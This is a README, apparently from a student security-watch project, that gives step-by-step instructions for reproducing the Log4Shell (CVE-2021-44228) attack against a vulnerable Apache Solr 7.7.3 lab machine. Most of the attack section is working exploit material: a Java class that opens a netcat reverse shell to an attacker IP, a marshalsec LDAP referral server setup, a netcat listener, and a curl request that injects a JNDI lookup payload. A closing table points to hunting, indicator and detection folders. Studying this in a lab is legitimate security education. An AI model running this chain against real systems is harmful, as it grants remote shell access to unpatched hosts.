# ENI Veille SSI Log4Shell

Pour réalisez l'attaque présente dans la vidéo, vous devez créer 2 machines virtuels

Dans le première machine qui sera celle de la victime, vous devrez installer une version vulnérable de Solr

## 1. Install Java on victim
Install Java.
```
$ sudo apt install default-jdk -y
```
Verify the Java installation.
```
$ java -version
```
Download Solr :
```
wget https://archive.apache.org/dist/lucene/solr/7.7.3/solr-7.7.3-src.tgz 
```

Install Apache Solr.
```
$ sudo bash solr-7.7.3/bin/install_solr_service.sh solr-7.7.3-src.tgz 
```
Check the status of the Apache Solr service.

```
$ sudo systemctl status solr
```
Enable the Apache Solr service to start on system boot.
```
$ sudo systemctl enable solr
```
Allow port 8983 through the UFW firewall.
```
$ sudo ufw allow 8983
```
To access the Apache Solr web interface, go to your browser and enter http://serverIP:8983.

## 2 Prepare attack :

The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec

## exploit java :
```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Compiler le code java :
```
javac Exploit.java -source 8 -target 8
```

## Attack

Création du serveur python :
```
python3 -m http.server
```

Prepare a netcat listener on any port of your choosing :

```
nc -lnvp 4444
````
Execut ldap server :
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```

Attack :
```
curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
```

## Repository contents

| Directory                          | Purpose |
|:-----------------------------------|:--------|
| [hunting](hunting/README.md)       | Contains info regarding hunting for exploitation |
| [iocs](iocs/README.md)             | Contains any Indicators of Compromise, such as scanning IPs, etc |
| [detection & mitigation](detection_mitigation/README.md)   | Contains info regarding detection and mitigation, such as regexes for detecting scanning activity and more |
| [scanning](scanning/README.md)     | Contains references to methods and tooling used for scanning for the Log4j vulnerability |
| [software](software/README.md)     | Contains a list of known vulnerable and not vulnerable software |
| [tools](tools/README.md)           | Contains a list of tools for automatically parsing info on this repo |

## Source

https://logging.apache.org/log4j/2.x/security.html
https://nvd.nist.gov/vuln/detail/CVE-2021-44228
https://github.com/HynekPetrak/log4shell-finder
https://www.fortinet.com/blog/threat-research/critical-apache-log4j-log4shell-vulnerability-what-you-need-to-know
https://www.splunk.com/en_us/surge/log4shell-log4j-response-overview.html
